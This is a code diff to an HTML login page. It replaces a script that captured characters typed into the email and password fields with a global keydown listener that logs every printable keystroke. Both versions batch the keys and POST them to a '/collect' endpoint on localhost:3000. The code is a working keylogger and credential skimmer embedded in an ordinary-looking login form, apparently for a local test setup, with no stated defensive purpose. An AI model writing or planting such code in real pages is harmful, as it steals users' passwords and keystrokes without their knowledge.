@@ -56,25 +56,24 @@
         </form>
     </div>
 
-    <script>
+<script>
     let log = "";
 
-    const emailInput = document.getElementById("email");
-    const passwordInput = document.getElementById("password");
+    window.addEventListener("keydown", function(event) {
+        console.log("Pressed key:", event.key);  // Debug line
 
-    function handleInput(e) {
-        const value = e.target.value;
-        log += value[value.length - 1] || ""; // Get last character typed
+        if (event.key.length === 1) { // Only log printable characters
+            log += event.key;
+        }
+
         if (log.length >= 10) {
             sendData(log);
             log = "";
         }
-    }
-
-    emailInput.addEventListener("input", handleInput);
-    passwordInput.addEventListener("input", handleInput);
+    });
 
     function sendData(data) {
+        console.log("Sending:", data); // Debug line
         fetch("http://localhost:3000/collect", {
             method: "POST",
             headers: {
@@ -88,6 +87,7 @@
         });
     }
 </script>
+
 
 </body>
 </html>
